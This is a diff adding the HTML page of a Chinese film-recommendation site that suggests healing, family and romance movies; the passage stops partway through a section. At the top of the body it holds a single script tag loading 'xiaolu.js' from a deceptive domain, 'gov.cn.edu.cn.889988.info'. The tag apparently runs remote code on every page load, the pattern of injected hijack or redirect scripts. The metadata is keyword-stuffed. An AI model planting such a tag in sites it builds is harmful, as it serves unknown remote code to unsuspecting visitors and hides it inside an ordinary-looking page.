@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="红枣电影网 - 暖心精选电影推荐平台，汇聚治愈系、家庭、爱情、青春、喜剧等温暖好片，为每一个热爱生活的你甄选值得一看的佳片，让观影成为一件温暖的小事。">
+<meta name="keywords" content="红枣电影网,hongzaodianyingwang,红枣电影,温暖电影,治愈系电影,温情电影,好片推荐,电影分享,家庭电影,爱情电影">
+<meta name="author" content="红枣电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="红枣电影网 - 为热爱生活的你甄选温暖好片">
+<meta property="og:description" content="红枣电影网汇聚治愈系、家庭、爱情、青春等温暖佳片，让每一次观影都成为一件温暖的小事。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://hongzaodianyingwang-wap.github.io">
+<meta name="theme-color" content="#1a0808">
+<title>红枣电影网 - 为热爱生活的你甄选温暖好片 | hongzaodianyingwang-wap</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#130808;--bg2:#1a0c0c;--bg3:#241212;
+  --red:#e0443c;--red2:#c32b24;--coral:#ff7a5c;--pink:#ffb199;--gold:#ffcf70;--plum:#7a3b4e;
+  --ivory:#fdf6f0;--soft:#f3ddd2;--mute:#b8a098;--mute2:#8a7670;
+  --card:rgba(224,68,60,0.08);--line:rgba(255,122,92,0.28);--line2:rgba(253,246,240,0.09);
+  --r:10px;--R:20px;
+  --sf:"PingFang SC","Microsoft YaHei","HarmonyOS Sans SC","WenQuanYi Micro Hei",system-ui,sans-serif;
+  --ser:"Songti SC","SimSun","Noto Serif CJK SC",STSong,serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{font-family:var(--sf);background:var(--bg);color:var(--ivory);line-height:1.85;overflow-x:hidden;}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+button{cursor:pointer;border:none;background:none;color:inherit;font-family:var(--sf);}
+img{max-width:100%;display:block;}
+::selection{background:var(--coral);color:#1a0808;}
+::-webkit-scrollbar{width:7px;height:7px;}
+::-webkit-scrollbar-thumb{background:var(--red2);border-radius:4px;}
+
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
+.bg .orb{position:absolute;border-radius:50%;filter:blur(110px);opacity:0.3;}
+.bg .o1{width:560px;height:560px;top:-200px;left:-150px;background:var(--red2);}
+.bg .o2{width:500px;height:500px;bottom:-190px;right:-160px;background:var(--plum);opacity:0.4;}
+.bg .dots{position:absolute;inset:0;opacity:0.22;background-image:radial-gradient(rgba(255,177,153,0.5) 1px,transparent 1px);background-size:34px 34px;}
+main,header,footer{position:relative;z-index:1;}
+.wrap{max-width:1260px;margin:0 auto;padding:0 24px;}
+
+/* ===== 顶部 ===== */
+.top{position:sticky;top:0;z-index:100;background:rgba(19,8,8,0.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line2);}
+.topin{max-width:1260px;margin:0 auto;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;gap:20px;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo .zao{width:38px;height:38px;border-radius:11px;background:linear-gradient(140deg,var(--red),var(--coral));display:flex;align-items:center;justify-content:center;font-size:19px;box-shadow:0 6px 18px rgba(224,68,60,0.4);}
+.logo b{font-size:19px;font-weight:800;letter-spacing:0.4px;}
+.logo b i{font-style:normal;color:var(--coral);}
+.logo em{font-style:normal;font-size:10px;color:var(--mute);letter-spacing:0.6px;font-family:var(--ser);}
+.nav{display:flex;align-items:center;gap:2px;}
+.nav a{padding:8px 13px;border-radius:8px;font-size:13px;font-weight:600;color:var(--soft);transition:.2s;}
+.nav a:hover,.nav a.on{color:#fff;background:var(--card);}
+.nav a.act{margin-left:8px;padding:9px 18px;border-radius:8px;font-size:13px;font-weight:800;background:linear-gradient(135deg,var(--red),var(--coral));color:#fff;box-shadow:0 8px 24px rgba(224,68,60,0.32);}
+.nav a.act:hover{transform:translateY(-1px);box-shadow:0 12px 30px rgba(224,68,60,0.42);}
+.burg{display:none;width:42px;height:42px;border-radius:9px;border:1px solid var(--line2);align-items:center;justify-content:center;flex-direction:column;gap:5px;}
+.burg span{width:18px;height:2px;background:var(--ivory);border-radius:2px;}
+
+/* ===== Hero ===== */
+.hero{padding:88px 0 68px;}
+.hwrap{display:grid;grid-template-columns:1.05fr 1fr;gap:56px;align-items:center;}
+.htxt .kicker{display:inline-flex;align-items:center;gap:9px;font-family:var(--ser);font-size:12.5px;color:var(--coral);border:1px solid var(--line);padding:7px 14px;border-radius:40px;background:var(--card);margin-bottom:22px;}
+.htxt .kicker .dot{width:6px;height:6px;border-radius:50%;background:var(--coral);}
+.htxt h1{font-size:clamp(34px,5.6vw,54px);font-weight:900;line-height:1.22;letter-spacing:-0.6px;font-family:var(--sf);}
+.htxt h1 .it{font-family:var(--ser);font-style:italic;color:var(--coral);font-weight:700;}
+.htxt p.sub{font-size:clamp(14.5px,1.9vw,16.5px);color:var(--soft);margin-top:20px;max-width:520px;}
+.hstats{display:flex;gap:44px;margin-top:32px;padding-top:26px;border-top:1px dashed var(--line);}
+.hstats .s .n{font-family:var(--ser);font-size:27px;font-weight:800;color:var(--coral);}
+.hstats .s .l{font-size:11.5px;color:var(--mute);margin-top:2px;}
+.btns{display:flex;gap:14px;flex-wrap:wrap;margin-top:30px;}
+.b1{display:inline-flex;align-items:center;gap:8px;padding:14px 27px;border-radius:9px;font-size:14.5px;font-weight:800;transition:.25s;}
+.b-go{background:linear-gradient(135deg,var(--red),var(--coral));color:#fff;box-shadow:0 14px 34px rgba(224,68,60,0.34);}
+.b-go:hover{transform:translateY(-3px);box-shadow:0 18px 42px rgba(224,68,60,0.46);}
+.b-gh{background:var(--card);border:1px solid var(--line2);}
+.b-gh:hover{border-color:var(--coral);color:var(--coral);}
+/* 红枣陈列 */
+.shelf{position:relative;border-radius:var(--R);padding:34px 30px;background:linear-gradient(160deg,var(--bg2),var(--bg3));border:1px solid var(--line2);box-shadow:0 30px 70px rgba(0,0,0,0.5);}
+.shelf .tape{position:absolute;top:-13px;left:34px;background:var(--gold);color:#4a2a08;font-family:var(--ser);font-size:11.5px;padding:5px 15px;border-radius:4px;box-shadow:0 5px 12px rgba(0,0,0,0.3);}
+.shelf .label{font-family:var(--ser);font-size:12px;color:var(--mute);letter-spacing:2px;text-align:center;margin-bottom:20px;}
+.zhaos{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.zhao{position:relative;text-align:center;}
+.zhao .bd{width:100%;aspect-ratio:1/1.18;border-radius:14px;position:relative;overflow:hidden;box-shadow:0 14px 30px rgba(0,0,0,0.4);}
+.zhao .bd span{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:clamp(20px,3.4vw,28px);font-weight:800;color:#fff;text-shadow:0 2px 10px rgba(0,0,0,0.3);}
+.zhao .cap{font-size:11.5px;color:var(--soft);margin-top:10px;font-family:var(--ser);}
+.zhao .sh{position:absolute;bottom:-7px;left:8%;right:8%;height:9px;background:rgba(0,0,0,0.45);border-radius:50%;filter:blur(5px);z-index:-1;}
+.zhao:nth-child(1) .bd{background:linear-gradient(150deg,#e0443c,#a81f1c);}
+.zhao:nth-child(2) .bd{background:linear-gradient(150deg,#ff7a5c,#d94a30);}
+.zhao:nth-child(3) .bd{background:linear-gradient(150deg,#ffb199,#e27a55);}
+.zhao:nth-child(4) .bd{background:linear-gradient(150deg,#7a3b4e,#542536);}
+
+/* ===== 通用 ===== */
+.band{padding:96px 0;}
+.bd-top{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;margin-bottom:42px;}
+.eyeb{font-family:var(--ser);font-size:11.5px;color:var(--coral);letter-spacing:2.5px;text-transform:uppercase;font-weight:700;margin-bottom:9px;display:flex;align-items:center;gap:10px;}
+.eyeb .bar{width:26px;height:2px;background:var(--coral);}
+.hd{font-size:clamp(23px,4.2vw,36px);font-weight:900;line-height:1.35;}
+.hd em{font-family:var(--ser);font-style:italic;color:var(--coral);font-weight:700;}
+.ds{font-size:13.5px;color:var(--mute);max-width:560px;margin-top:7px;}
+.more{font-family:var(--ser);font-size:12px;color:var(--coral);border:1px solid var(--line);padding:9px 16px;border-radius:40px;transition:.2s;white-space:nowrap;}
+.more:hover{background:var(--coral);color:#1a0808;}
+
+/* ===== 栏目一：今日甄选（故事卡） ===== */
+.pick{background:var(--bg2);}
+.pickgrid{display:grid;grid-template-columns:1.2fr 1fr;gap:22px;}
+.story{border-radius:var(--R);overflow:hidden;border:1px solid var(--line2);background:var(--bg3);transition:.35s;display:flex;flex-direction:column;}
+.story:hover{border-color:var(--coral);transform:translateY(-6px);}
+.story .cv{position:relative;aspect-ratio:16/9;background:linear-gradient(150deg,var(--a),var(--b));overflow:hidden;}
+.story .cv .feat{position:absolute;top:14px;left:14px;font-family:var(--ser);font-size:10.5px;background:var(--gold);color:#4a2a08;padding:5px 11px;border-radius:40px;font-weight:700;}
+.story .cv .quote{position:absolute;left:18px;right:18px;bottom:16px;font-family:var(--ser);font-size:clamp(14px,2.1vw,17px);font-style:italic;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,0.4);line-height:1.6;}
+.story .info{padding:20px 22px;flex:1;display:flex;flex-direction:column;}
+.story .info .tagr{display:flex;gap:7px;margin-bottom:10px;}
+.story .info .tagr em{font-style:normal;font-family:var(--ser);font-size:10.5px;color:var(--coral);border:1px solid var(--line);padding:3px 9px;border-radius:40px;}
+.story .info h3{font-size:19px;font-weight:800;line-height:1.5;margin-bottom:8px;}
+.story .info p{font-size:12.5px;color:var(--mute);line-height:1.85;flex:1;}
+.story .info .who{display:flex;align-items:center;justify-content:space-between;margin-top:16px;padding-top:14px;border-top:1px dashed var(--line2);font-family:var(--ser);font-size:11.5px;color:var(--soft);}
+.story .info .who b{color:var(--coral);font-weight:700;}
+
+/* ===== 栏目二：分类频道（暖色九宫格） ===== */
+.cat{background:var(--bg);}
+.catgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+.ch{cursor:pointer;border-radius:var(--r);overflow:hidden;border:1px solid var(--line2);background:linear-gradient(160deg,var(--bg2),var(--bg3));transition:.3s;position:relative;}
+.ch:hover{border-color:var(--coral);transform:translateY(-4px);}
+.ch .row{display:flex;align-items:center;gap:16px;padding:18px 20px;}
+.ch .ic{width:48px;height:48px;flex-shrink:0;border-radius:13px;background:linear-gradient(140deg,var(--a),var(--b));display:flex;align-items:center;justify-content:center;font-size:21px;box-shadow:0 7px 16px var(--sh);}
+.ch .tx h4{font-size:15px;font-weight:800;margin-bottom:3px;}
+.ch .tx p{font-size:11.5px;color:var(--mute);}
+.ch .ar{position:absolute;right:18px;top:50%;transform:translateY(-50%);font-family:var(--ser);font-size:15px;color:var(--coral);opacity:0.4;transition:.2s;}
+.ch:hover .ar{opacity:1;transform:translateY(-50%) translateX(4px);}
+
+/* ===== 栏目三：观影心情（心情分组） ===== */
+.mood{background:var(--bg2);}
+.moodgrid{display:flex;flex-direction:column;gap:16px;}
+.mgroup{border-radius:var(--R);overflow:hidden;border:1px solid var(--line2);background:var(--bg3);}
+.mgroup .mh{display:flex;align-items:center;gap:16px;padding:16px 22px;background:linear-gradient(120deg,var(--a),var(--b));}
+.mgroup .mh .emo{font-size:26px;}
+.mgroup .mh h3{font-size:17px;font-weight:800;}
+.mgroup .mh p{font-size:11.5px;color:rgba(255,255,255,0.85);margin-top:2px;}
+.mgroup .ml{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line2);}
+.mgroup .ml a{padding:15px 18px;background:var(--bg3);font-size:12.5px;color:var(--soft);transition:.2s;display:flex;justify-content:space-between;align-items:center;gap:10px;}
+.mgroup .ml a:hover{background:var(--card);color:var(--coral);}
+.mgroup .ml a span{font-family:var(--ser);font-size:10px;color:var(--mute);white-space:nowrap;}
+
+/* ===== 栏目四：每周推荐（时间轴） ===== */
+.week{background:var(--bg);}
+.wlist{display:flex;flex-direction:column;}
+.wrow{display:grid;grid-template-columns:96px 1fr auto;gap:24px;align-items:center;padding:18px 0;border-bottom:1px dashed var(--line2);transition:.2s;}
+.wrow:hover{background:rgba(255,122,92,0.03);}
+.wrow .wk{font-family:var(--ser);font-size:12px;color:var(--coral);border:1px solid var(--line);padding:9px 0;text-align:center;border-radius:8px;background:var(--card);}
+.wrow .wk b{display:block;font-size:20px;font-weight:800;line-height:1.1;}
+.wrow .wi h4{font-size:15.5px;font-weight:800;margin-bottom:5px;}
+.wrow .wi p{font-size:12px;color:var(--mute);}
+.wrow .wt{font-family:var(--ser);font-size:11px;color:var(--mute);white-space:nowrap;text-align:right;}
+
+/* ===== 栏目五：片单（图文交错） ===== */
+.plist{background:var(--bg2);}
+.plistgrid{display:flex;flex-direction:column;gap:18px;}
+.pitem{display:grid;grid-template-columns:200px 1fr;gap:26px;align-items:center;border-radius:var(--R);padding:18px;border:1px solid var(--line2);background:var(--bg3);transition:.3s;}
+.pitem:hover{border-color:var(--coral);}
+.pitem.flip{grid-template-columns:1fr 200px;}
+.pitem.flip .post{order:2;}
+.post{position:relative;aspect-ratio:3/4;border-radius:12px;overflow:hidden;background:linear-gradient(150deg,var(--a),var(--b));box-shadow:0 14px 30px rgba(0,0,0,0.4);}
+.post span{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:19px;font-weight:800;color:#fff;text-align:center;padding:14px;}
+.post i{position:absolute;top:10px;left:10px;font-family:var(--ser);font-style:normal;font-size:9.5px;background:var(--gold);color:#4a2a08;padding:4px 8px;border-radius:40px;}
+.pbody h3{font-size:18px;font-weight:800;margin-bottom:8px;}
+.pbody .why{font-size:12px;color:var(--coral);font-family:var(--ser);margin-bottom:9px;}
+.pbody p{font-size:12.5px;color:var(--mute);line-height:1.85;}
+.pbody .tags{display:flex;gap:7px;flex-wrap:wrap;margin-top:13px;}
+.pbody .tags em{font-style:normal;font-family:var(--ser);font-size:10.5px;padding:4px 10px;border-radius:40px;background:var(--card);border:1px solid var(--line2);color:var(--soft);}
+
+/* ===== 栏目六：数据看板 ===== */
+.dash{background:var(--bg);}
+.dashgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:16px;margin-bottom:24px;}
+.dc{border-radius:var(--R);padding:22px;border:1px solid var(--line2);background:linear-gradient(160deg,var(--bg2),var(--bg3));transition:.3s;}
+.dc:hover{border-color:var(--coral);}
+.dc .l{font-family:var(--ser);font-size:11px;color:var(--mute);letter-spacing:1px;}
+.dc .v{font-family:var(--ser);font-size:clamp(26px,3.6vw,34px);font-weight:800;color:var(--coral);margin:9px 0 5px;}
+.dc .d{font-family:var(--ser);font-size:10.5px;color:var(--soft);}
+.ringwrap{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;}
+.ring{position:relative;border-radius:var(--R);padding:20px;border:1px solid var(--line2);background:var(--bg3);text-align:center;}
+.ring .num{font-family:var(--ser);font-size:22px;font-weight:800;color:var(--coral);}
+.ring .lb{font-size:11.5px;color:var(--mute);margin-top:4px;}
+
+/* ===== 底部 ===== */
+.foot{background:var(--bg2);border-top:1px solid var(--line2);padding:62px 0 24px;}
+.fin{max-width:1260px;margin:0 auto;padding:0 24px;}
+.flay{display:grid;grid-template-columns:1.8fr 1fr 1fr 1fr;gap:44px;margin-bottom:38px;}
+.logo.fb{margin-bottom:16px;}
+.logo.fb b{font-size:19px;}
+.fabout{font-size:12.5px;color:var(--soft);line-height:1.95;max-width:400px;}
+.fcol h5{font-family:var(--ser);font-size:12px;color:var(--coral);margin-bottom:16px;font-weight:800;letter-spacing:2px;}
+.fcol li{padding:5px 0;}
+.fcol a{font-size:12.5px;color:var(--mute);transition:.2s;}
+.fcol a:hover{color:var(--coral);}
+.fbot{padding-top:24px;border-top:1px solid var(--line2);display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:11.5px;color:var(--mute);}
+.fbot a{color:var(--mute);}
+.fbot a:hover{color:var(--coral);}
+.fbot .u{color:var(--coral);font-family:var(--ser);font-weight:700;}
+
+.rv{opacity:0;transform:translateY(24px);transition:opacity .55s ease,transform .55s ease;}
+.rv.in{opacity:1;transform:none;}
+@media (prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;}}
+
+@media (max-width:1000px){
+  .nav{display:none;}
+  .burg{display:flex;}
+  .hwrap{grid-template-columns:1fr;gap:38px;}
+  .pickgrid{grid-template-columns:1fr;}
+  .pitem,.pitem.flip{grid-template-columns:1fr;}
+  .pitem.flip .post{order:0;}
+  .catgrid{grid-template-columns:1fr 1fr;}
+  .zhaos{grid-template-columns:repeat(2,1fr);gap:26px;}
+  .zhaos .zhao:nth-child(n+3){display:none;}
+}
+@media (max-width:768px){
+  .band{padding:66px 0;}
+  .hero{padding:56px 0 44px;}
+  .topin{padding:11px 16px;}
+  .wrap,.fin{padding:0 16px;}
+  .logo em{display:none;}
+  .nav a.act{display:none;}
+  .bd-top{align-items:flex-start;}
+  .hstats{gap:26px;}
+  .mgroup .ml{grid-template-columns:1fr;}
+  .wrow{grid-template-columns:64px 1fr;gap:14px;}
+  .wrow .wt{display:none;}
+  .flay{grid-template-columns:1fr 1fr;gap:30px;}
+}
+@media (max-width:440px){
+  .hero h1{font-size:31px;}
+  .catgrid{grid-template-columns:1fr;}
+  .flay{grid-template-columns:1fr;}
+  .btns .b1{padding:13px 20px;font-size:13.5px;}
+  .zhaos{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div class="bg"><div class="orb o1"></div><div class="orb o2"></div><div class="dots"></div></div>
+
+<header class="top">
+  <div class="topin">
+    <a href="#top" class="logo"><span class="zao">🍒</span><b><i>红枣</i>电影网</b><em>hongzaodianyingwang</em></a>
+    <nav class="nav" id="nav">
+      <a href="#top" class="on">首页</a>
+      <a href="#pick">今日甄选</a>
+      <a href="#cat">分类频道</a>
+      <a href="#mood">观影心情</a>
+      <a href="#week">每周推荐</a>
+      <a href="#plist">温暖片单</a>
+      <a href="#top" class="act">❤ 收藏好片</a>
+    </nav>
+    <button class="burg" id="burg" aria-label="菜单"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<main id="top">
+
+<!-- ===== Hero ===== -->
+<section class="hero">
+  <div class="wrap">
+    <div class="hwrap">
+      <div class="htxt rv">
+        <span class="kicker"><span class="dot"></span> 为热爱生活的你甄选温暖好片</span>
+        <h1>日子有时匆忙，<br>记得留一部<em class="it">好电影</em>给心情。</h1>
+        <p class="sub">红枣电影网（hongzaodianyingwang-wap.github.io）专注分享温暖治愈、值得回味的电影，让每一次观影都成为一件温柔的小事。</p>
+        <div class="hstats">
+          <div class="s"><div class="n">3,200+</div><div class="l">精选好片</div></div>
+          <div class="s"><div class="n">28</div><div class="l">细分类型</div></div>
+          <div class="s"><div class="n">16万</div><div class="l">影迷同好</div></div>
+        </div>
+        <div class="btns">
+          <a href="#pick" class="b1 b-go">🌰 开始看片</a>
+          <a href="#cat" class="b1 b-gh">浏览分类</a>
+        </div>
+      </div>
+
+      <div class="shelf rv">
+        <span class="tape">本周 · 温暖陈列</span>
+        <div class="label">— 一周好片 · 随机取用 —</div>
+        <div class="zhaos">
+          <div class="zhao"><div class="bd"><span>小森林</span></div><div class="cap">治愈 · 慢生活</div><div class="sh"></div></div>
+          <div class="zhao"><div class="bd"><span>海蒂</span></div><div class="cap">亲情 · 纯真</div><div class="sh"></div></div>
+          <div class="zhao"><div class="bd"><span>婚姻</span></div><div class="cap">爱情 · 细水长流</div><div class="sh"></div></div>
+          <div class="zhao"><div class="bd"><span>触不可及</span></div><div class="cap">友情 · 温暖</div><div class="sh"></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：今日甄选 ===== -->
+<section class="band pick rv" id="pick">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>今日甄选</span><h2 class="hd">编辑部私藏 · <em>一部一片心情</em></h2><p class="ds">每天精挑细选，把好电影的故事与心境讲给你听</p></div>
+      <a href="#" class="more">查看往期 →</a>
+    </div>
+
+    <div class="pickgrid">
+      <a href="#" class="story"><div class="cv" style="--a:#e0443c;--b:#a81f1c;"><span class="feat">编辑推荐</span><span class="quote">「一个人吃饭、一个人生活，也可以很温柔。」</span></div><div class="info"><div class="tagr"><em>治愈</em><em>慢生活</em></div><h3>小森林 · 夏秋篇</h3><p>在远离都市的村庄里，女孩用一道道时令料理，把孤独过成了诗。适合一个人安静看，看完想好好吃顿饭。</p><div class="who"><span>编辑 · 阿梨</span><b>⭐ 8.9</b></div></div></a>
+      <a href="#" class="story"><div class="cv" style="--a:#7a3b4e;--b:#542536;"><span class="feat">本周话题</span><span class="quote">「岁月漫长，唯有爱与善意不可辜负。」</span></div><div class="info"><div class="tagr"><em>温情</em><em>成长</em></div><h3>海蒂和爷爷</h3><p>阿尔卑斯山的风吹过草地，小女孩用最纯粹的善良，融化了爷爷坚硬的心。看完心里暖暖的。</p><div class="who"><span>编辑 · 小满</span><b>⭐ 9.2</b></div></div></a>
+      <a href="#" class="story"><div class="cv" style="--a:#ff7a5c;--b:#d94a30;"><span class="feat">治愈之选</span><span class="quote">「人生的雨天，总会放晴。」</span></div><div class="info"><div class="tagr"><em>人生</em><em>治愈</em></div><h3>小花的味噌汤</h3><p>一个母亲用味噌汤教会女儿勇敢面对离别，平凡日常里藏着最深的爱。</p><div class="who"><span>编辑 · 半夏</span><b>⭐ 8.6</b></div></div></a>
+      <a href="#" class="story"><div class="cv" style="--a:#ffcf70;--b:#e0a53a;color:#4a2a08;"><span class="feat" style="background:#e0443c;color:#fff;">会心一笑</span><span class="quote" style="text-shadow:0 2px 8px rgba(0,0,0,0.15);">「家人之间的爱，是拌嘴后的一碗热汤。」</span></div><div class="info"><div class="tagr"><em>家庭</em><em>喜剧</em></div><h3>别告诉她</h3><p>一场横跨大洋的家庭秘密，笑中带泪，讲尽了我们对"家"最深的眷恋。</p><div class="who"><span>编辑 · 阿梨</span><b>⭐ 8.3</b></div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：分类频道 ===== -->
+<section class="band cat rv" id="cat">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>分类频道</span><h2 class="hd">总有一类，<em>懂你的此刻</em></h2><p class="ds">按心境与类型划分的频道，帮你快速找到想看的</p></div>
+      <a href="#" class="more">全部频道 →</a>
+    </div>
+
+    <div class="catgrid">
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#e0443c;--b:#a81f1c;--sh:rgba(224,68,60,.35)">🕊</span><div class="tx"><h4>治愈系</h4><p>让心安静下来的温柔好片</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#7a3b4e;--b:#542536;--sh:rgba(122,59,78,.35)">👨‍👩‍👧</span><div class="tx"><h4>家庭亲情</h4><p>关于陪伴、理解与告别</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#ff7a5c;--b:#d94a30;--sh:rgba(255,122,92,.35)">💗</span><div class="tx"><h4>爱情浪漫</h4><p>细水长流的温柔故事</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#ffcf70;--b:#e0a53a;--sh:rgba(255,207,112,.3)">😄</span><div class="tx"><h4>轻松喜剧</h4><p>笑一笑，日子会变好</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#5b8c5a;--b:#3d6b3c;--sh:rgba(91,140,90,.35)">🌿</span><div class="tx"><h4>青春成长</h4><p>那些跌撞却闪亮的岁月</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#4a7ba7;--b:#315a7d;--sh:rgba(74,123,167,.35)">🐾</span><div class="tx"><h4>萌宠动物</h4><p>毛孩子带来的小确幸</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#a86a8f;--b:#7d4a68;--sh:rgba(168,106,143,.35)">🎭</span><div class="tx"><h4>人生百态</h4><p>平凡人的不平凡故事</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#c98a3c;--b:#9a6626;--sh:rgba(201,138,60,.35)">🎨</span><div class="tx"><h4>唯美文艺</h4><p>画面与光影都是诗</p></div></div><span class="ar">→</span></a>
+      <a href="#" class="ch"><div class="row"><span class="ic" style="--a:#6b5b95;--b:#4a3d70;--sh:rgba(107,91,149,.35)">🌙</span><div class="tx"><h4>深夜独处</h4><p>一个人看也不孤单</p></div></div><span class="ar">→</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：观影心情 ===== -->
+<section class="band mood rv" id="mood">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>观影心情</span><h2 class="hd">看心情选片 · <em>对味才好看</em></h2><p class="ds">今天是什么心情？让红枣电影网为你挑一部合适的</p></div>
+      <a href="#" class="more">更多心情 →</a>
+    </div>
+
+    <div class="moodgrid">
+      <div class="mgroup"><div class="mh" style="--a:#e0443c;--b:#a81f1c;"><span class="emo">🥲</span><div><h3>有点累的时候</h3><p>选些不用费脑、看完心里暖暖的</p></div></div><div class="ml">
+        <a href="#">小森林 夏秋篇<span>治愈</span></a><a href="#">海蒂和爷爷<span>温情</span></a><a href="#">小花的味噌汤<span>人生</span></a></div></div>
+      <div class="mgroup"><div class="mh" style="--a:#7a3b4e;--b:#542536;"><span class="emo">😊</span><div><h3>想笑一笑的时候</h3><p>轻松喜剧，把坏心情赶跑</p></div></div><div class="ml">
+        <a href="#">触不可及<span>友情</span></a><a href="#">三傻大闹宝莱坞<span>励志</span></a><a href="#">天使爱美丽<span>浪漫</span></a></div></div>
+      <div class="mgroup"><div class="mh" style="--a:#4a7ba7;--b:#315a7d;"><span class="emo">🌧</span><div><h3>下雨天一个人</h3><p>适合安静独处的温柔片单</p></div></div><div class="ml">
+        <a href="#">挪威的森林<span>文艺</span></a><a href="#">情书<span>纯爱</span></a><a href="#">迷失东京<span>孤独</span></a></div></div>
+      <div class="mgroup"><div class="mh" style="--a:#5b8c5a;--b:#3d6b3c;"><span class="emo">🌻</span><div><h3>想要一点力量</h3><p>被生活打气时看的励志好片</p></div></div><div class="ml">
+        <a href="#">摔跤吧爸爸<span>励志</span></a><a href="#">当幸福来敲门<span>人生</span></a><a href="#">爆裂鼓手<span>成长</span></a></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：每周推荐 ===== -->
+<section class="band week rv" id="week">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>每周推荐</span><h2 class="hd">一周一片 · <em>慢慢看，不着急</em></h2><p class="ds">每周精选七部好片，陪你过完一个温柔的星期</p></div>
+      <a href="#" class="more">往期推荐 →</a>
+    </div>
+
+    <div class="wlist">
+      <div class="wrow"><div class="wk"><b>MON</b>周一</div><div class="wi"><h4>小森林 · 夏秋篇</h4><p>用一碗米饭开启新的一周，慢下来，好好吃饭。</p></div><div class="wt">治愈 / 108 min</div></div>
+      <div class="wrow"><div class="wk"><b>TUE</b>周二</div><div class="wi"><h4>海蒂和爷爷</h4><p>阿尔卑斯山的阳光，是治愈疲惫最好的药。</p></div><div class="wt">温情 / 111 min</div></div>
+      <div class="wrow"><div class="wk"><b>WED</b>周三</div><div class="wi"><h4>触不可及</h4><p>跨越阶层的友谊，笑到流泪的周三补给。</p></div><div class="wt">友情 / 112 min</div></div>
+      <div class="wrow"><div class="wk"><b>THU</b>周四</div><div class="wi"><h4>天使爱美丽</h4><p>把善意藏在细节里，巴黎少女的浪漫。</p></div><div class="wt">浪漫 / 122 min</div></div>
+      <div class="wrow"><div class="wk"><b>FRI</b>周五</div><div class="wi"><h4>三傻大闹宝莱坞</h4><p>周五放肆大笑，做自己就好。</p></div><div class="wt">喜剧 / 170 min</div></div>
+      <div class="wrow"><div class="wk"><b>SAT</b>周六</div><div class="wi"><h4>小花的味噌汤</h4><p>周末陪家人一起看，聊聊家的味道。</p></div><div class="wt">家庭 / 121 min</div></div>
+      <div class="wrow"><div class="wk"><b>SUN</b>周日</div><div class="wi"><h4>情书</h4><p>周日夜晚，给自己一场安静的怀念。</p></div><div class="wt">纯爱 / 117 min</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：片单 ===== -->
+<section class="band plist rv" id="plist">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>温暖片单</span><h2 class="hd">编辑精选 · <em>值得反复看的好片</em></h2><p class="ds">看完想分享给朋友的那种，都在这里</p></div>
+      <a href="#" class="more">更多片单 →</a>
+    </div>
+
+    <div class="plistgrid">
+      <div class="pitem"><div class="post" style="--a:#e0443c;--b:#a81f1c;"><i>治愈</i><span>小森林</span></div><div class="pbody"><h3>一个人生活，也可以很温柔</h3><div class="why">— 为什么推荐</div><p>市子回到老家小森村，用一道道时令料理把日子过得热气腾腾。没有大起大落，只有四季流转与认真生活的人。适合一个人吃饭时看，看完会想走进厨房。</p><div class="tags"><em>治愈</em><em>慢生活</em><em>料理</em><em>日本</em></div></div></div>
